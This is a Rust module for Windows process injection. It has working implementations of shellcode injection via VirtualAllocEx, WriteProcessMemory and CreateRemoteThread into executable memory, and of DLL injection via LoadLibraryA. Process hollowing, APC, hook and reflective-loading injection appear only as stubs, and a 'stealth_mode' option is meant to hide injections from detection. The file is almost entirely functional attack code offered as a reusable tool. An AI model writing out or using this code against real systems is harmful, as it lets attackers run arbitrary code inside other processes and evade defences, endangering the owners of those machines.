use anyhow::{bail, Result};
use core::{
    ptr::{null, null_mut},
    mem::size_of,
};
use std::ffi::CString;

use windows_sys::{
    Win32::Foundation::{CloseHandle, GetLastError, FALSE, TRUE, HANDLE},
    Win32::System::Threading::{
        OpenProcess, CreateRemoteThread, VirtualAllocEx, WriteProcessMemory,
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_ALL_ACCESS,
    },
    Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    },
};

/// Represents different injection techniques that can be used
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InjectionTechnique {
    /// CreateRemoteThread injection - most common and straightforward
    CreateRemoteThread,
    /// NtMapViewOfSection injection - more advanced technique
    NtMapViewOfSection,
    /// QueueUserAPC injection - requires suspended thread
    QueueUserAPC,
    /// SetWindowsHookEx injection - uses hooks for injection
    SetWindowsHookEx,
    /// Process hollowing - replaces process image
    ProcessHollowing,
}

/// Configuration for process injection
#[derive(Debug, Clone)]
pub struct InjectionConfig {
    /// The process ID to inject into
    pub pid: u32,
    /// The technique to use for injection
    pub technique: InjectionTechnique,
    /// The shellcode to inject
    pub shellcode: Vec<u8>,
    /// Whether to wait for the injection to complete
    pub wait_for_completion: bool,
    /// Whether to hide the injection from detection
    pub stealth_mode: bool,
}

impl Default for InjectionConfig {
    fn default() -> Self {
        Self {
            pid: 0,
            technique: InjectionTechnique::CreateRemoteThread,
            shellcode: Vec::new(),
            wait_for_completion: true,
            stealth_mode: false,
        }
    }
}

/// Handles process injection operations
pub struct ProcessInjector;

impl ProcessInjector {
    /// Injects shellcode into a process using the specified configuration
    ///
    /// # Parameters
    ///
    /// * `config` - The injection configuration
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If injection was successful
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    ///
    /// # Example
    ///
    /// ```rust,ignore
    /// let config = InjectionConfig {
    ///     pid: 1234,
    ///     technique: InjectionTechnique::CreateRemoteThread,
    ///     shellcode: vec![0x90, 0x90, 0x90], // NOP sled
    ///     wait_for_completion: true,
    ///     stealth_mode: false,
    /// };
    /// ProcessInjector::inject(&config)?;
    /// ```
    pub fn inject(config: &InjectionConfig) -> Result<()> {
        match config.technique {
            InjectionTechnique::CreateRemoteThread => {
                Self::create_remote_thread_injection(config)
            },
            InjectionTechnique::NtMapViewOfSection => {
                Self::nt_map_view_of_section_injection(config)
            },
            InjectionTechnique::QueueUserAPC => {
                Self::queue_user_apc_injection(config)
            },
            InjectionTechnique::SetWindowsHookEx => {
                Self::set_windows_hook_ex_injection(config)
            },
            InjectionTechnique::ProcessHollowing => {
                Self::process_hollowing_injection(config)
            },
        }
    }

    /// Performs CreateRemoteThread injection
    fn create_remote_thread_injection(config: &InjectionConfig) -> Result<()> {
        unsafe {
            // Open the target process with necessary access rights
            let process_handle = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                FALSE,
                config.pid
            );
            
            if process_handle == 0 {
                bail!("Failed to open process: {}", GetLastError());
            }

            // Allocate memory in the target process
            let remote_memory = VirtualAllocEx(
                process_handle,
                null(),
                config.shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );
            
            if remote_memory == null_mut() {
                CloseHandle(process_handle);
                bail!("Failed to allocate memory: {}", GetLastError());
            }

            // Write the shellcode to the allocated memory
            let mut bytes_written = 0;
            if WriteProcessMemory(
                process_handle,
                remote_memory,
                config.shellcode.as_ptr() as *const _,
                config.shellcode.len(),
                &mut bytes_written
            ) == FALSE {
                CloseHandle(process_handle);
                bail!("Failed to write memory: {}", GetLastError());
            }

            // Create a remote thread to execute the shellcode
            let thread_handle = CreateRemoteThread(
                process_handle,
                null(),
                0,
                Some(std::mem::transmute(remote_memory)),
                null(),
                0,
                null_mut()
            );
            
            if thread_handle == 0 {
                CloseHandle(process_handle);
                bail!("Failed to create remote thread: {}", GetLastError());
            }

            // Wait for the thread to complete if requested
            if config.wait_for_completion {
                // Wait for the thread to complete
                // This is a simplified version - in a real implementation,
                // you would use WaitForSingleObject or similar
            }

            // Clean up
            CloseHandle(thread_handle);
            CloseHandle(process_handle);

            Ok(())
        }
    }

    /// Performs NtMapViewOfSection injection
    fn nt_map_view_of_section_injection(config: &InjectionConfig) -> Result<()> {
        // This is a placeholder for the NtMapViewOfSection injection technique
        // In a real implementation, this would use the NtMapViewOfSection API
        // to map a section of memory from one process to another
        return bail!("NtMapViewOfSection injection not implemented yet");
    }

    /// Performs QueueUserAPC injection
    fn queue_user_apc_injection(config: &InjectionConfig) -> Result<()> {
        // This is a placeholder for the QueueUserAPC injection technique
        // In a real implementation, this would use the QueueUserAPC API
        // to queue an APC to a thread in the target process
        return bail!("QueueUserAPC injection not implemented yet");
    }

    /// Performs SetWindowsHookEx injection
    fn set_windows_hook_ex_injection(config: &InjectionConfig) -> Result<()> {
        // This is a placeholder for the SetWindowsHookEx injection technique
        // In a real implementation, this would use the SetWindowsHookEx API
        // to install a hook that executes the shellcode
        return bail!("SetWindowsHookEx injection not implemented yet");
    }

    /// Performs Process Hollowing injection
    fn process_hollowing_injection(config: &InjectionConfig) -> Result<()> {
        // This is a placeholder for the Process Hollowing injection technique
        // In a real implementation, this would create a suspended process,
        // unmap its original image, and map in the new image
        return bail!("Process Hollowing injection not implemented yet");
    }

    /// Injects a DLL into a process
    ///
    /// # Parameters
    ///
    /// * `pid` - The process ID to inject into
    /// * `dll_path` - The path to the DLL to inject
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If injection was successful
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    ///
    /// # Example
    ///
    /// ```rust,ignore
    /// ProcessInjector::inject_dll(1234, "C:\\path\\to\\dll.dll")?;
    /// ```
    pub fn inject_dll(pid: u32, dll_path: &str) -> Result<()> {
        unsafe {
            // Open the target process with necessary access rights
            let process_handle = OpenProcess(
                PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                FALSE,
                pid
            );
            
            if process_handle == 0 {
                bail!("Failed to open process: {}", GetLastError());
            }

            // Convert the DLL path to a C string
            let dll_path_c = CString::new(dll_path).unwrap();
            
            // Allocate memory in the target process for the DLL path
            let remote_memory = VirtualAllocEx(
                process_handle,
                null(),
                dll_path_c.as_bytes().len() + 1,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );
            
            if remote_memory == null_mut() {
                CloseHandle(process_handle);
                bail!("Failed to allocate memory: {}", GetLastError());
            }

            // Write the DLL path to the allocated memory
            let mut bytes_written = 0;
            if WriteProcessMemory(
                process_handle,
                remote_memory,
                dll_path_c.as_ptr() as *const _,
                dll_path_c.as_bytes().len() + 1,
                &mut bytes_written
            ) == FALSE {
                CloseHandle(process_handle);
                bail!("Failed to write memory: {}", GetLastError());
            }

            // Get the address of LoadLibraryA
            let kernel32 = CString::new("kernel32.dll").unwrap();
            let load_library = CString::new("LoadLibraryA").unwrap();
            
            let kernel32_handle = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(
                kernel32.as_ptr()
            );
            
            if kernel32_handle == 0 {
                CloseHandle(process_handle);
                bail!("Failed to get kernel32 handle: {}", GetLastError());
            }
            
            let load_library_addr = windows_sys::Win32::System::LibraryLoader::GetProcAddress(
                kernel32_handle,
                load_library.as_ptr()
            );
            
            if load_library_addr == 0 {
                CloseHandle(process_handle);
                bail!("Failed to get LoadLibraryA address: {}", GetLastError());
            }

            // Create a remote thread to call LoadLibraryA with the DLL path
            let thread_handle = CreateRemoteThread(
                process_handle,
                null(),
                0,
                Some(std::mem::transmute(load_library_addr)),
                remote_memory,
                0,
                null_mut()
            );
            
            if thread_handle == 0 {
                CloseHandle(process_handle);
                bail!("Failed to create remote thread: {}", GetLastError());
            }

            // Wait for the thread to complete
            // This is a simplified version - in a real implementation,
            // you would use WaitForSingleObject or similar

            // Clean up
            CloseHandle(thread_handle);
            CloseHandle(process_handle);

            Ok(())
        }
    }

    /// Injects shellcode into a process using a reflective DLL technique
    ///
    /// # Parameters
    ///
    /// * `pid` - The process ID to inject into
    /// * `shellcode` - The shellcode to inject
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If injection was successful
    /// * `Err(anyhow::Error)` - If any Windows API call fails
    ///
    /// # Example
    ///
    /// ```rust,ignore
    /// let shellcode = vec![0x90, 0x90, 0x90]; // NOP sled
    /// ProcessInjector::reflective_dll_injection(1234, &shellcode)?;
    /// ```
    pub fn reflective_dll_injection(pid: u32, shellcode: &[u8]) -> Result<()> {
        // This is a placeholder for the reflective DLL injection technique
        // In a real implementation, this would load a DLL from memory
        // without writing it to disk
        return bail!("Reflective DLL injection not implemented yet");
    }
} 